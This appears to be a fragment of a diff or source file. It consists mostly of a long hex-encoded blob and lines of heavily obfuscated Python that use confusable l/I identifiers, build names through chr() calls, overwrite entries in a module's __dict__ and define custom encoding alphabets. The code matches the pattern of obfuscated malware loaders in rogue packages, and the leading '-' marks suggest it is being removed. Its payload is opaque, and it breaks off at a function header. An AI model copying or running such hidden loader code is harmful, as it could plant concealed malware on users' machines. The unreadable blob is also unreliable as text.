34a8e3598fd296581536b620b1670bfe6eb4c1ac5f7ca76dda31a5234ea58a344e75416844b01109497bfdab5e3e9a9b81a8d2001b604e080aef13c7856c4c103ffe79bc2a42025f7366765d9bb34bb04085f7ccc74ad7deca4f6e7aaa87ad411c0c7eae602256791a53d92d15d7368034215049874038149b6aee8bb1cde4a60f33b2081fbb99926d410ab59d640dd069e8613f1694265ad1c152c0a51b1494ed1e28054375eae96f8568a21cc829354391e5f0b6c8e3c03121552a118ee4d070b9108b4649b3c5d99ce8df509b1253615954b5d1714b4097d7cdb922e1c191eccbb82decf3400816ae1cb39ab2c41a0c303b2d60e6354b1fcb91c1a4adb7462cc802a8725343a895839658a9ba16c481c82f64306e81a962d9acafee145ac767a04a945886fc049372bd43a901e30d25430192ea57cfc63db5a9a053ccf1ca010aef76614cf5a766572a1a1ef0b0f2b2b56dcd32014854f673ce03fd108312c2e5c2e43d51235ebf3d254e9a35cee6c40217820b6b6209901d225a09e4f2ba2f436e2b7d6dae0fabdbc297dbc5becf5cacc972ce6eca1d48c340ad1ad69d51ebcda41241648a0f986f7524643a728faa048ed02c64d0e39151e0bed6974685d68a1b6290a00ed074616442aa4a4ed21c903fc07b1e58d3cfa803bdc4e83b0af78bfe0e7c3ef26bb5ead7286b2c832a568eabde6eb12d595a6713e42c4196c37ba6e61ea71b606b0d8d6680b37954e9853581149645551b1db7447179dd912b12329c3d469484f77525d45b07b8ca8285c94d46a5a2e101af1852443d7befb866b1c303d5aef93051a8b0edf123c42860032bfa58bb3bb7f653b1bbc8bc2fdc6e02ee720f10aa9477ffa4e2c37534184940049dfdecc144403482eda1ebac920e81702836d5dc17639be993b4983c5eb2301b88264db9e26641de47138072268c2e64308d67164c5dd090c3815aeaeb05b3ede35f7817e8b6e9471c717cde9ce40655acbc5875f7eb7d5d1794805ca494039bb7451e0081fb4ea544387ee382e4691b8d906687b339d11d0304b2268a00d921a295102eaf6319226bea75e6cd0d0ff5ada952037469d3c7656bd1f7751043cb8132765ad96e37ba9ad41bf6552ca2a73274cd368cd3ca9b69df4e6ac7db96e2e347bcde5fddbfe5b5d377fc1e742fef856fee21b2f6bce4d1ec29c7159de982429c74e6f8654155afc754c00bdc09ed57c2e92b254b6599c8ce52682e1228940718ed5a7d6c61bc298550186813d6cddfe290f600be400b6e41ae255b5be82dc5626ef32c71373ed59d9c82acf72483da84d3d1e46d91c7eb9052a15a9d38a25b18dc05451123e430d6182304b2be008c46c1479645751a1db0c46e791d4a92ad1cb27fdb818e287679a64a0e827de921777378d9df6550835a2781ef2905922d6e53752d882341b860ce3d7fdc59c843a998f5c80185266ccf964edcaccd36b030a66e50b32b150d0f78a1785928ae5982eecfde111135b6f8c84b3a6219eff9dab719b1d12cb00533ad5de42dac09214c768880257ecbeb4892c87a761c64ef0b137fed995897b357536ec8c51d2ffbbb448bc6b3377c4a12309a0be6dc73f6dad2493949fc30280506290e4a97a763a50c58c8216b919d4396a3816959c58af51511c23b951cafa8128f1dafcab773d47a71201564870855a2b8bcee40b1843f87c607d46de1fb9728678d5b2c5c396e356509f32ac3a06215229afbb4369421be2715e4b6b855d5b5201e1b24c4df5836e5c759a00848b60f4f4d2040c2d008a20779c367e4da6d735a360ad34d36f21c7d5b4595d310d0414d4c29edbbc385530f88c861e8454025cba2aa8d8e5b22babceecf1595ccd9cdc7d96d61c70740adadcba9e9da914156471f1e9cba136abd99366d6199f910f89278e4b0c28b8b90c37a0a448fa6074d6b029d9caa92933407e4c3abce03eb7c087cc514437ead56fd1a658d6550c5ca717598f9022a839c25c872784fd7e26f2561c6d6e06826d88299da18259035a1149645551b1db7c47179dd912bb2ba1de3941e1a25d276f501ca8285c95d46a5a2e101af1652403d7bf3b866b1c303d5aef93051a8aeedf314f8c896bdbb1aa2663e027e7689795fd8e98720d15b79df4faa3a5c47621a849a64a90606c9743fffd87e40789d3dbe060a865a22a1ea5a100f3e25577c83a3db989332bda518e139cef2c6606687622ba493ba34b25c090ce98f516a954c545c9a0a4ebc30a874a37277bb51ff61bb79b6e3b5fff18e93ceed3ae9f2b0969285ebd8547afc5df264e50ad8a5a7a9dcc54a8cad242d6ea08c746db4a6133733e554ca80853180a666572a1a1ef032f96531b26619395878b29fedc6afafa0802fb83ff28f8e55c6db228f27a0929aa6db3cb296bc36b7b2eb5134369a05b660a6b58bb98535c1b3253b44a812b9e575577aec3355ed710b93989a535153a2341512d5b0ee2c5a6f26d5032233bfba581207326221831e8f74f9f7b5be342ab456dc1083047580a60b2313525572d27c07802d1555b7c98c14b795ced1752dfb51b563cd1274ff29baef6569c284845ca4c395f19eaf07aee926044b5047c8666c86abf4c29a800264878856a2b9bc0e64c8560ad9bd6708b92d4c7b42646d418eae4d1921377a78d9df6550e70d437fe48e4f49024673c19c47f9400f9c813910156ecb81485303041811209a530d44d762294723a6c46146233fafa291d2ec11f53bfb5c742d967242da6e94a02e48f61a96bebff2633f4a7325429c1073cb83b962f5fd048ca2863d49b4de4c2a0944667eec571207326221831e8f0c04f7b5be342ab456dc1083047580a60b2313525572d27c07802d1555b7c98c14b795ce29772dfb51b563cd12747f76e321b0416590b374e032ded335c48acba221d20c713627cabb385c581350615954b5d1714b3497d75db9b2e7703b73b46501cbd1b6294fac4908b3d312e634b63871fc3fd56d4ed77a6bc4822c78fa3654c93c42b390c1b8bdfe084b19dd0493723daa14cf2713a59ea9542e7e9423d9840bd1397a0a5541a7f40d5e6d40b1de2e8c390aa8d9958a4e109bdb2cc0d41c15c80369e614ba354bd0fd391e84c0069541ced281cb784fd7a1fbe9140d906686b33951dd45e1c29a700acba2aa8d8e5b62b9bc0ee78a004487c647d66de1ed83e4f9bf82f1a0d1fa85676dc28897fd5d06cd507512f89e5290d9e23655d7823812840be6dcf32bb8421ee24a207e720f141da3f8964e394bbc34ad94010b630a0435bb52d1f08017bb97c5dc9a25e8fe6c19436083ca2067e9c065bc27ecda248da351d26c713627fabb505c581353615954b5d1714b4097d7c15c1160e8d0f8b8ba2dd4cf46bdbd7a9f90fa2663a75f38cc09af2f0119be18bc15ab10d1ecef41d6a9e27b52290a2d6e55752d88c70609f1375664f9972d500424db87a72610206168045187370655154b4bf01e9673c1b2256bb718b9ffd3dd414057029b2970ff67a82023aa41b5d8e5f1b7e34ef4e3d43f2bb418da61c829261f5f410130707fe41f057c36efe9e60d4436235c8242516812a840d6c4d396ec10a14a3097d77130cbdadaf89d703c9bfa6f7d20b231bad0d12dfebcdd40e4cefd41bda61dfbb692773b7c6ebf2fccfe6b005ba1bc8bd554099bea100988a0b39f3b980888968b94aff8964696ca2260a17b7438628846a5665160f2d826268f972ccc06a24953aeb85990b79e04a09c09a30b194ce39905531734e470a096fa7ac16cfbf817de05ba6dfa11471c9f77c2b841152b2f5603fb63cced9c1acab127d5029bb7451e4080fb4ea5443878a322b47e7f469c346b9ccd89051823903581b4253b44a812c5e5750f8a4bb2be0684214b54b1a9696e8131050797ad2583af83e87e8e9bb1c3cb76bba19565d82d2cdd0ea6ca68430a51fd67e61c986d29bee44f70e39a109ad02844a7ce2878d9df257a4ca302d754935866d91a5a52555d0be2481008388ff2c47e84fbae8dd674e266a69c4a19b03006d0d4ec4a45c3035e26bf2c46d62c41f7e7f454703b6ece01664dd692d7c656820ad1f06846389b13055dd82dac899f2dd9214295e02daffbe7a1ddc6a1ebbc6f2ab088e560d49428ccab0c868a558828ffca66c3a0b8b33d4888bfb172e65fd934113dc81b3e23d76e9bd3b251986eb291a768dd6aaa9c83800e6a624a69df172e1b44d1006966d88299ea18299035e1149645551b1db7c472791dcc1509158e7c5fc66d61a767cbd1b0e56cd4942d56df8ed9692173fa2f9c40f93c7747aaaa6b413c72f4e07545c8d51195a7d0fa01d3869b6052ae772835f224460191ea154f034d9939f5123bda9483c2b95d1853eda9d9958a86073c6cbc6c2d5bb3cc04ceb3cf01be8202bee0fee15a61f29eabfb16d95a43a319600b664abb905b58133b5bb243842a815b5e47d3a349df9e39e6b6f0659fdff606adc143166a0760bd4bbad018323453cc54a1fc6833480fa4f004da4a6d55b9207cb91652319fd1c0f88cf4e7f429e37d859c0ea2114d55ed1572861a87089c4d87250fa1a9c998de20fb5c5534b7e5dfb20ba9f87428507295d02c64b8a2c64e7017906d8206f688e69b25495bf1c626e75f9173832a565e263a268292aa777a84ca20672990b4795be4f1eaa3d425d1873492a3c3d585d18264586a2a0a4a452f81d5298baa363a6e89eaf2ba3f5754326737e0c8897f1d5c53e97b47bd265be8969c29968d72e8bc7c80fb143fe171f8dfed20bec9bb7f4d05c91a9708ec440d7bf271bd9974ee1099e22f04b63a12322925c487bb2c95258115d093cfbf3148500768ba303221552527cd7700d8523b906d39953260614cd5a566572a1a1ef072518dc3d3d58e354bd0fd39f285c0069541ced281cb78cf387589ccad01d2ccb00533d55d142eac09a7b02caadae8b82596cbeb21b9327b36b92decf57721c5a66e3f94b36eb38e0cd3aa61ddf9b4de4c1b01b0cc9c754be240462c64d0e339eb3aba303221552527690ec8af709c07d6f429b48156c28f152f2dbe99fdfdf87cf8d76ad5af51d6580655ac1c5cf18eb129559c133e3bfb35594b0df0b7ea816541322c1b15f5314c206b6209931d226009e4f2ba2349567493672a3d404abcb75e7095050b433a52ee964a45c3035e29a4b07af60e72cd628707aa5df361a2b61239f7574223d63ec2d8ce3ddd82707fa3a3a8bc2fe42f061088b4579ab5fc11e74ed358464a91a0b3946d1078cf5f439574088443b1a9e6be18db4c1f93c5e4f19285d9403469ca15310b645b9042607a31181ba043f38fcbd65a205f074b01976e5050b67ba0140cd5a9279c2e3754bdad3f5406394b90e5f0b6c8e3c03121552a719039cfd3381a25cd166773a27f436d4a4c856551d546c72d015d5ef74c56fb8d56d7895faa2056e690d594233964ad6872c812ec199c582cc2c71eb2cca0c61c4755c62439a9e5a4b666c5fa8a46e6a4f6e48d5df176ce6a6742952c8baa363a6e09e9f27a4caeec37b44dfc1e3c313787b6a66491a704bcecef12ad22671ed52e98d3ee169bb453940438af8f48f31abc94983068ebc22a45846818654d563a6c18dbbc121a4414db43ccd2613955d0291a7af622079939ebc0886b4fcd6e49362f495410d719e9a79f92c52db10e141c0363a54ce4fe7334f51d2e2a48b2955e93056b1826f193281a23cd126773a2bd9b580b6b82684b7688502582cbebf6f4d032d791ed03e9b6b0d3af1c78dd4dcebfcd3ab234510deb4ea0f566daac8065e65f7e97c4818c58c8a0c7234dfe7dad2f8d0aad1537c420411da0e9c2c88454959c34df01604b45d56d3223c56da573725dcb7e54ed58b304dd7f8ea6bba2ca3116e820fa9046726cb83c8da351d26c713627fabb505c581353615954b5d1714b4097d7e15c9195ed994c6e0bc5f3c0efafce0783e71f4fd6af638ec80623494241673ff73011100d93e0c83da6920e8170c42ac2c5d866f29c85195984dd421686895702e34e88bac60c65037468fe71d9da51eaeb6029e0d20d0aca768fd34e6bbe82424d82fb23ff08b21cde13f67335598e6a2f0ea882ec10a14a3497d7dd68569de76ce623ebb630f769d4c4e21cb09af245eee8f1b2bf4bb4909c79acba60ce9dbf835bd04939a9b6f7a080cc53146fe6d6495bbbfc786c2dfb51185bb3e4c06568d1e1a282245bb435594b5e7b5b4d8b906687b339d1dd557a614d086dc90e11aac46f79dd3d62e9f175b6f3b1755b78ff2c6cb7
-1ffd018c397235e50f830799bafa2ba7ea1c107f186d81c8150c69e674898af99c46c80e1faa4ce5e2cd486ec5520e27cdc834d90fbd32bf19008be61530b0661958a2b0402bd628f3fcbfec1d98fa4e2a2eacd9b15e899391601dc28cf7844de3b4086976389b13dd5da517d684d096ec10a14afc96d7e1f4f85851f4ed3895df17263f88f47aa5d6e680d7942bd61442c0286ad89344ebcda4924064e6dff595c4e3fb692452c8613d05a287d0b02e9c3a40d3859109a92a3969be03c0968aaadb64468adb4ae707976bd98faa1d6b96a0fbcfd180df97260c49c8453a5c19ef89db60579b68a4347b9ccd890d2e0817d64413203b44b412cae5755f865cabd426aaf48c23b78579bf5b4854467ae578db94387a2fdf034168ab9f56576eebd3778d8a3bdb8384f81b2ba9d88d9271779781c50a1c780fcbb960d992b5dbacb8ffd3dd41c8a74c65a6c0fd9fa11284a806551f97c7df8e3bd18f537f2fdb62688721a7e8cc7d0505c0c0fd917f14f0d9bc27ee8c8552118d956691a721b642aa6f09264c7688502592cbebe6f4d012d7111d05bf9c4b4a6968f0f78e8d798305a26a7bf69ede97d6469d1bd2ae34cb1aa2b0516e6839f576f5a16695bee06e910db9ba74d3eedde896e035a718b9820d23b6b014d9185d687a78ada427821202cb1b1d10785f98f883603522f286b289675f47b51028ea060b16902a17acadec63753a40414043d0b9f733087815a9c476edb3a653462f2fab7cedf29b386bd98f82c89a25e8fef6d3bc662368235af8ac585f1121234efdd6690a7949472ce36d91c7d3504950cf7926594b763b5bf989148d906687b339d1ddc5dfc29a40c264870858a2b8bcee9a8f14183a343eae6e0bcb33b58ff91c6deaad9cb49a722d27ad9cb46c1a6b678b9f4e4dfbe9088a9d979195326021a7b445764e698e06a665156b174206f48502d8a032c8593a7019efe9da3c3f9da201d2cc703627aabb285c58134e615954b5d1714b2c97d7fd239baa74ffd836ff89002c72397735258c3533b4f4da607b384cb4cc127eb27dbcd1d45a73073e7d37aa641ea159c860dc224dff7dadafe6145a2b6e08a73e6674134ccaf5a8523c9f4c947aa652b9f8978daa35b26b9bb63d35aaa0537a07af2ca0306f17c69c02d4ec4a45277ecdad1660aa23e6a39147b9a09953e3d62c41f79f6244f01514f005f72725c1ddcfe63d55632e72b54646d3df16cc747611b7b02674b664870855e2b6bc0ea587040347ba2fe3b630ef19045b6f5418dd6ba136daf10c11e284b3903f222f1aba3a9adc82ce52b60122201a26c1911b3d251d02e1902b8d548b35df9b0ac52c611176cb4e18265ec18a3b21ea1a33940dd0a1f9c7656ba79eaf83a5804b372828db3d4e3b32f9f1126a12dc1f09166439bc276cbd72681aa4fd31c153901d225489dcf23a9c1eed5a0f19a0f6788cdb8366a7f30d5378d9df255a48ce3c425d30e79e5ffe14f2105702f149f040d1318a6fe99453c54bd34a19b030a64050b32b150d0f78b17b59ccad5982ee3f47bf5851e5e40574107d482339365cbd2d878fdd869454947771b8b026a0c2b2a86aa3e396682eafbb7365c7c7694ffc2c0bb0e708d6942466ef63f74591545edee3b23554aa09f8829da6925f8373d0f336c2622c0317b29ea3146d1dcfdaa19658c810d02f59a10bd22c0d179393cc34be82021ee1fec83f3ab619ef791b1f81261a2acda098820db52bb1b4253b44a812c8e575203d241038b27d19b785e5f923c52b1f46a22cac5f7a8e1f7118228c78d9df65504b566780ef2905e32d6e53752d882341b860ce7c1849a38ea0f2791959290316c6d4026a76a5a2e1010f042f0baf354b8e695c0b5f41015f707fe41f1dab8cf74cddddbcd86816389b9b5a27780aee9ccb4e85dc4a0ad9bd7f28cbbf8b22a1cdd189d68a67efed9424603417cc799c27e60329390d1968a854343ce0e5f5cb2266cd92d310d7c25750c017dc1ff947c72ae33d554fd5a44b344e9a35cee64441177f0b6b02694b768850258acbeb2e14af88769b95667fdc9413d3b523551ada3e9aef82ce7ebe602220ba56c2df5f016a8b03590486cf4e8673e5e2239567cdf7a642314b5884dde213868957b686c0c88c4e031a684a71d9dad9e6eb6029e0d2ede5e7ca5ea2deb377773555ce4c40073569592407866b6a9c346b9ccd89050dd52951159645551b1db78474793d6a8012351f33435df7799004342b27aaa6dcd15b14d52a150194ce7fccbd5f8280f57532f9be5610dfe27816b90993d88ac0cc134ce5e31d79bd7e49a9dac037a24bc7cb31bc2c64d07d818d96cdfaea75a175dc2d9528754b2de66a2a44ec646e44cb22d6c2ef522549f19a1ab0930ca1be8242d4e1fed10cb279cfdaa4bab812041c627641ac09a22dd9214295082eaffb10dc4ee7f5957ea0e73eae90d892c36553c6880160cbfe2e83dadf3a037c4f29286d719baa6b411c09c20573e6df8635ea080a959791953260614c2da066572a1a1ef040f0b2f05ab3e484a568b12ce5b8c5943846b3d691d505c911ba78c49a980acba2aa8d8e5b02babceec91559df412357fe35d9d639448813d7427e0e5b07ee069524603417cc7998bf2603d0efda684d97135338b24f8791354b4e4c9e16fd108312908b74b832de73b655abab9c9506697f5834156487885642b9bc6ecf10510147b80fa6dbc2edd1879d4f3accd10a38e6a946ab3b5348673fd93011100d93e0c80da4920e8170c8b54aaae69aef4d856296b008bb952b0c13afe6c59d10758d19ca06e8d0fce3b2b573d3d7c152c0a51b1494ed1e671ec5967fe734c69478ec34164ee282e4081d3d624d0861b243042cf15b5e47f1bbcf0036f5d11daec2394f35a5895ce7f1b2bf4bb47e9c798aba60cedd3eaa5ac89a2b06511d2adb9efd036d042a29e78e97d1d0219b8531b5849a5da968786094c39f0e9e6b96a0fbcfd2576ea87242033a883ea4913ce018e003b8212f150b5c302eac89aab02caadae8b825a4cbeb78ae68e9ecece1a3ebb630f58fb958bc72686b4a13bd5def011cb4d54fa32bb7f5e9bb46c59ded4142fc8d7553ec46c9a4a9d83e3c358100094323881ee40d9f916bb7cd69d9284c37d9c8ece25afc55906423b526dba67d385cbd87bf005c3d1515a53146206b02292c8baa363a6e89e2f23a922b5a223bd27d5cdd16beecf52116352ca7a2a66cb13af6f060d49d4cebcdb4690acb747b2a9069822321d3d946305eda841cd653207a0c3d681a13e8e454959ca439605001b39218bc87e5b0ea221a26e41bdae13cb0a6dff70c779a4262f30ae35bdbdf89cfaf02b55af56b94359641152bc7587cae68ca18e7a0cf9e7e4dd6520af8568abba2e1d18c7036278a638040d64411263b44c012c2e5754792e8fa76cc537a6c94506f1de02a0b168674a3dc2d958a8607bc2a4811f5ecdde39ac50e0f54bbe6c3446dd5d1dbdb2f65e6be016b1f61ec883d65d4f75697f785dd7e380533e57d3fa9e8701d09235ef67789f629cf5e5595246034a4b83de6694b5236120f34b786c6964a34e3f0b136af848e4b6bc493dd5976670db8286522f74bb9ea141b529288163e2bd65744c8c046cdf1b9542374e032de16793c1b953c157d4823393e5ca00e4029ad91d2ecf1f4c336b8705c581357615954b5d1714b5097d7ddb9d280fc9e43ef7d61eaf37c91596e63943367b38e26a66955735a5e9c41fe0f7336e76dbd356241163c7d83aa641ea159c860dc2273c07dadaff4145a2b6e08a73e6674134ccaf50ea5461ecb282052bde269a02933a75e6247bbe7a1ad5d0edb6bd98faa656b9699c0c9a100f93cfbf235594b922b5b4d8d94668fb339b1c185e3c29ab80acba2aa8d8e5b82babc6ece152d8b1dd13ea86e0bb70742df5ebd8f85beee30a43f68147fedd9dc53c44f26a6e5f21e97ad415b4de817ec5a95fc1a9c839eb7518d8a65e04236f424a9b5212acf3481434280bd043a5dd04e03aa0514f01e968342d56098e0ee6032bc48e9e0a1b5cdf14de1198f03532a39e8d4f5bdd73f47b4442156556ab5ead7286b2c832a568ed9e054e42bc85d5490e42cb2266b292af656e1042e488625a0a2374606644df86cc90e11aac46e791d4d8f8f95be4e12786fee57f811f7e4aff013f679dfded76c3c62eca10e5ff6f8920631376f0335150abdd754adf2f3d0a1f3bfb5e19f37c0fa3a997c5f9b09b8d0c85259e4aca2d077a057c2611160ee6a8c44fd9252b581cf2b3ef1292c8697850cba2fb0d1b2595fad2eb48ebba512a56ea9c55c4d85889dcc8d6859c45af85daa24295e530396771336dc4e99cb89644d2666a7b795a76734369a05cee66d0505b12678b66487085522b7bc8ea64745d4d9adf8c8ba2decf0ab69803c67caa684692f28b47c393d244e9bfcdabf2355d5b520cee928d86c4b668672bd078f8a5992a71191ed0e2f31034d17cd28ef510a035364cb1328d538c6ee016c6b977f71b096fda832ba6609baff1483474d35a5c6b5552db4670e02abb7679e42a61db660a6bb0bc38535f1149645551b1db70473791dc9152d911de93eae6e0bfb3d3a8e852d47faa66c813466cad042d63ee65c6d47fa49f7f1465363cd1df8f4bda8927984662183718bb4fcf7b5beda5368adb8219cfa98d14d3029d73b946a3f4eab1725430192ea57cfc63db5a9a053ccf1ca010aef76614cf5a766572a1a1ef0b0f2b2b56dcd3201485476ce05509970e13079cfd59a6fde9e1227cd1a677362810bc6853551159645551b1db78474791dc995ad18b27dcfd0735b98f8fb8cc4b69cac9b3243eefff0b2bfcba0cebbce00df530a1a5bdca6ea5a10478270c19c7b3f977d4dd75e0ab41a93139701a24a45c3031e1c5e16686b969cb8b816be8202bee0fec83f3a5619efb93a324296c3d68b03aa203b44a812cde575079ae5c03afbf8a0ba2dbc7dae999f6a22d5b6af63ce5ecb3f303bad614e678b13283fd574a4aaba16c481c8d33ac1eb8b90abc11032419a1bc2a98f19dd049372bd43a9603d50022609776bf0b0c253d0295d818775143bc74f39409b289c53b8d62c735082653f5bbf5f534d99ce90b374e032ded3f5df8acba221d20c713627cabb385c581350615954b5d1714b3497d7f15c9180e16ce1cbb82d7cfefaf9fe40f2014f235f5efdc23ec6fb9fef5f63be2c7adf45dddf795fff525157443509173880f68d8e08f9f4f9eb97719672eaaf5f4ee2ce26a606f57a25736bbeaeffd47e5e06b4d0c63379a02999670325bf92318d52afabdc3c1ace1e122fa314ad7f9be4fbabf710cf5a6055cbf9c9d8664f13b2b3da1fa04022e1833b8a0ccc40c92f63ccf39dc11ffb1fac03181ff37af6db9eeafdb379169783e1f1d58c01cc9679831b2a74fbe47ab8d2114c84c18ddb638de9cb3dd63c1da2bccdefdd8f61e769cbb8654f7d66df5e037f30f4f8c01f5b753349074a7e4e63faeadef5e9efd4b71e122f6feb737504a72d42c5087b98e1d5a0de2153f7f9dcb88536bb4afa461ed82325374a0dbd719d302a9f35a15fe9ee49348f32871e59479070cb1273c7afa3be30d79e13c7bc77d79e2a7ab6e567990f07cf098c79825ba239870eef249ed409e13cf789b846f52de9dd0f3f6616a3defb0ccba3eaa0d5fda58c193afce6802b47238f9ec7230209f7c6b843357607bc6bdb9621fa56c076f299f6513a89c4e440c9b63187bc23d8599b4ef4e930391c8f5264c75bdd9df5d96af1378e5eac9ec89851c30104f8233f37bff50e0ff99bf223d6f5d1999cb7160f08e69732264f46f3bdbd43e6321daaa36ba13dca67ed0fed42c9a89d83f642b72342d9b874b42f227ebcf7621f64e49ddb437604838df978ef7877581f1093b2fe9fea8f861e90c3476939b2babcae315eab9e0978bc980def3d0ceaf1fa6b53fda1e6443b0e31153f8ed283cc4e9cfa68e93223188728464d75e5c9beb11d3f4b72ca3af031f404c67cbc77a803e5b499b41a20077ee876c48fd23afd34385b0719f5906ccc0f116736db799be1e145f160c61cb2b5a4e616b724739852d80ff92dc93d60e032e55193b570aee43d1f573ba6074d3c3c3285aed12f0a82af6a1ce5a9fb9cfa702786d83f7f7f254e0e566a5fcd18c0bcdbaffc1cf249c5a1983fcdf1db952939d31f0dc2ab49f5457ec26e8ffc3ee29dddc496143abe677e1443df787893f152c6b4df1eead5e3a0dfc08e15dffce4e5a0791d35e6bd0379a9bbe403f07a2c830231ef4e9b43fd3143569dd7aa3a8f383833ee5b7ca3bfdc7bad1bc2901625dab1d4deb7dee7d7fac7f6c8ce819a8e7ef183cc653ae28df33963c5e675a0bf0e7c80b39efc98e9b861708ca83d61c9f389b8464e01ca90a8c97b4d67bdfa91fd5863dafb0bf7a0b91eaebfa81ecafa901f577b923398dc0b3998ea0fadc98728c99d1d549ec33b57e38ff7f25ca76fe4b95e49fe7e700df998ecfbeba79be86fe7d0a7dbbffef087b7ffffe1edbf6ffabebf53bc717be783fb43d1f7eb2feb8b3f30b9ef6fdfae877defe843917724ddae2ed7eb96f376f943f1fe9de407cab62c209acbbb27e8ee979a112902f6b3545aabb5a924ca5e97c6dd2fdbcb7bf87db7af8436faded272ad2af6efbad13374bc581aac89b61e807cdbad1def78996059f971a17a8fb9dbd7c15200d1dd4b839191481a800adea2395c96ae5a02ab4e90f1d614fa2fd899082072aa8eb24d93a507eefbebcb7ab1214092fc114442e5c101d3d2def3961053a6a45131b67c5f88158ca3a38e01a77ffbef98a7116d5e433aa8379af726a9e8953e7a9e4fe06ad3107d7b2d4dd45a2010fbd182e1d5a293e24242ba7d488564b8d3b376adf6f95269de2cd3b764b381c2767f17abe33bcf711c0e2fb46bedaa322680eefda249ff4afded6767231028f983a8f9ae184d732371de0d595ce66fc4dce3e79794583093af6b2457de92aa80551b82220b744acef86267e7d6d19f473e7aa735ce38cc864557927242892bb56382a4f26a9f1ad1
-ba229f1e1f916359ffb1a5adc9fa3d72d67830f203bc91ef9fb2c219656e8b76bf2b31ea8ec7f6309b51d088b76e145545a91d6a9ede0e4e384878e0ae9b62d771e09741e3995328d3948b4a4b659767b997aa8337e8b785d65e6968d83671321ae96d1df13b03b51c5667103e73c5b8b456a1783fdd83a9ab58c0d4e0b51f3d5b5718476167611700e415c0193f2802141d3103d4fe33bc00fab9ee89ae79148ab4c74d236bc33c29817c035caba460fe75cd8fcc93669faab9a66ab19a41c61cab6369c8a933e8c8581b27a58b3c9f4626ff407f36486937c8f57f5b5c61c366488b142911cdad8264b3777f82fc971c3723be9f2478b1336748789b5becb6e3cc6c765aa712365eb7d5ec6dcd77551dd60846ee1985ced54ec792c375d84dfe96f65de93d845b5cbe0fc4f67cda0deabb97371df7c7d7397aefbdfb0d6a67def5dc465fbf87b398d5dedebf46b79476cfc641f1ae8c0d43d62d384df7a03e54ac7114eaacb7ce744d6dbacf844ea786fabab2755c5b78377ec69f3819ad515b1f297c48baf64e5be344031bbd2559aa62ab33064031f950df1618e98d6c5b48ec7bf8d70f9048db7f2d3362444f306cecae4b8feffd0f7034b5af839b769a74f5c7e350bb50d7f3e12b7cbbb7fdec8e7c0cb32993636f7daffc58809717bac66f697849d21af8c8e1d35232467f844760669ccb52f3ba0424dc82b0a675d4f7b4e52f19b116bcfb0b176bf4357de544f21319149a527309a324cacf0fa30f6074cdbd216e0a4721307c13a08ed0f067752bbeb2bfdd8023289691962fc048d51799c14a9d2cbda1206d5cd6f31da7c639dea9e8e299aeddf4338ff361df0e0d7cf8db34b7348ca2e1d2acf3b5cd6ef231dd7e4a80bc9bfd51193f8a82c3a355d70b0fb6fbe31e9aaa184ffb30adffc650ff8dd8ce8ad6801ffdb3346670e0c0bd16f5a30ec43508bb0fbe29e5bfe50b95c0e806649757e80084b7be7a1131f0f82c2aeaa86f2338910a7d7b09ad9aa39c72044ab3b95111bbbf29d59adbd735ea0447b947572170d44859e83ce25b486d3365f7d9eeb5196e14f4b4506d02ee68affb4a2d0bdea7f1baed062b95dc745a2aa52c6e2bf3c874ed0792f505b120e4b96f91546facba6fde340284e628e1a38951a9bd46fee096d36a44277cbc6a54e8dbfffef411de9fdf7beccbf2dff7545f3d126295fc97b777be61a262f338ef04947d910ff82f0e63b9c746c65d31570035c1571debeeeb4d4d2e685cdd91dd4d124c0166dc6fd24b3eeef28bb909ddc6c80cae18df6bf5be9055efd1a7bea57a33463b1c1c48561cb64130dd09d4b7fd4444d91e16fd4bdd6ba04e082d67bea29495595d95d54ab5e1176acc6a8b1a6f7e79828551a84fc4d692462851a8aefa75c9dadadbd9a9ae34b10550d89be304718a15db52c9c815ad7d02f342e59edd5ed52215cb2859c2d1e7edbbb68c6b4f8a17e692eb16eb9258cda25d95d354f16eecaa142a7c3cb73454d4b76a7cbc587b85a062170aad0b62b56e7972d69bb95d96114ba79055bcd069751fc04b94516d9c4265e58358a734e8b37a65962ab7bbb2f7b63d20d64aa968b97ab0ba25384f6cbdd0ccc29b2e2b67ec22e61ee37e25a33d62432d731b19a99639454568c5fc72e257373f8bb5e2c6fd2a8e8d7ca4f34a9a0044d29e5967a2d594e18437eb9ddb41ea6324af9bac2f93caa43f4e16621cad6d454583b52cc7f54db1599d2c8573dba876bcdc99d54e395fbc7287ef4235746de436963a635a376abc02670ed74adb063a56a9966dd25c2a5fb8fcb9cd58dd90d2415238fccc9205dce10d9276d1d26f7be1d9c19a22d16d0daf4239feb15b310f6c52adb232960e8f5e58e5bb5fd869bc2e49c38859a2c8992f0c934057b928c192a4d6a3fa08536e79d9b5c82f46d6dd6aa524b19b22526d324f61bb42e13687d62863275a9ab601b16b5215be862284f0414b106875bcfec8990accfa637e9cf19df5eb9fee62fe5489ffb45af9843cf04dc0cfe5678337e19fbffee0b07ee77ca375293b365976f9fed325358564df1f6f5b3365d75b38fa7cfaf9ab4e6cd9bd7ceb167ffc5f7e2de0f923f7f9ff03694d5181""")
-lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(lIllll)+(llllllllllllllI(lIllll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll))] = lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(114) + (llllllllllllllI(lllIll) + llllllllllllllI(112) + llllllllllllllI(lIlIll) + llllllllllllllI(IlIIll) + llllllllllllllI(99) + llllllllllllllI(lllIll))];IIllIlI='-_+!1@2#3$4%5^6&7*8(9)0qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFG';lilIIlI='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';lIlllllIl='ihQlwp==';lIIIIIlI='e2)dtYTmyh)Eym==';IlIlIlIIIIllI='uq*h%(p=';IllIIllIlll='+p=='
-def llIIlIlllllIIlllII(lllIllllIIIllIllII):
